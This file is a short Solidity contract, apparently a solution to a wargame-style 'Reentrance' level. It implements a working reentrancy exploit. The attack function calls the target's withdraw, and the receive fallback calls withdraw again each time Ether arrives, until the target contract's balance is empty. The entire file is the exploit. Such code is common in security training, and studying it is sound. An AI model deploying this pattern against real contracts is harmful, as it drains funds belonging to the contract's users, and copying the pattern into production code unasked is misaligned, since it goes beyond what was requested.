// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Reentrance} from "../levels/Reentrance.sol";

contract ReentranceAttack {
    Reentrance public instance;
    uint256 public userAmount;

    constructor(address reentranceAddress) public {
        instance = Reentrance(payable(reentranceAddress));
    }

    function attack(uint256 amount) public {
        userAmount = amount;
        instance.withdraw(amount);
    }

    receive() external payable {
        if (address(instance).balance > 0) {
            instance.withdraw(userAmount);
        }
    }
}
